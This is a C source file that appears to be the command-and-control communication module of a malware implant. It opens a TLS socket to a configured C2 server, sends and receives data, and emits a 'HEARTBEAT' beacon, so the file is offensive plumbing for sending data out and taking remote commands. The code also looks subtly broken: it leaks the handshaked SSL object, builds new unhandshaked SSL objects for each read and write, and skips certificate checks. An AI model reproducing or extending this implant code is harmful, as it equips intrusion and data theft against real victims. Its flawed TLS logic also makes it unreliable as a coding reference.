#include "c2_communication_fixed.h"
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

SSL_CTX* ctx = NULL;
int sockfd = -1;

void init_c2_communication() {
    // Initialize OpenSSL
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    ctx = SSL_CTX_new(SSLv23_client_method());
    if (!ctx) {
        perror("SSL_CTX_new failed");
        exit(EXIT_FAILURE);
    }

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket failed");
        SSL_CTX_free(ctx);
        exit(EXIT_FAILURE);
    }

    // Connect to C2 server
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    if (inet_pton(AF_INET, C2_SERVER, &server_addr.sin_addr) <= 0) {
        perror("inet_pton failed");
        close(sockfd);
        SSL_CTX_free(ctx);
        exit(EXIT_FAILURE);
    }

    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect failed");
        close(sockfd);
        SSL_CTX_free(ctx);
        exit(EXIT_FAILURE);
    }

    // Create SSL connection
    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sockfd);
    if (SSL_connect(ssl) <= 0) {
        perror("SSL_connect failed");
        SSL_free(ssl);
        close(sockfd);
        SSL_CTX_free(ctx);
        exit(EXIT_FAILURE);
    }

    printf("C2 communication initialized\n");
}

void send_data(const char* data, size_t length) {
    if (sockfd < 0 || !ctx) {
        init_c2_communication();
    }

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sockfd);
    SSL_write(ssl, data, length);
    SSL_free(ssl);
}

void receive_data(char* buffer, size_t length) {
    if (sockfd < 0 || !ctx) {
        init_c2_communication();
    }

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sockfd);
    SSL_read(ssl, buffer, length);
    SSL_free(ssl);
}

void send_heartbeat() {
    const char* heartbeat = "HEARTBEAT\n";
    send_data(heartbeat, strlen(heartbeat));
}

void close_c2_communication() {
    if (sockfd >= 0) {
        close(sockfd);
    }
    if (ctx) {
        SSL_CTX_free(ctx);
    }
}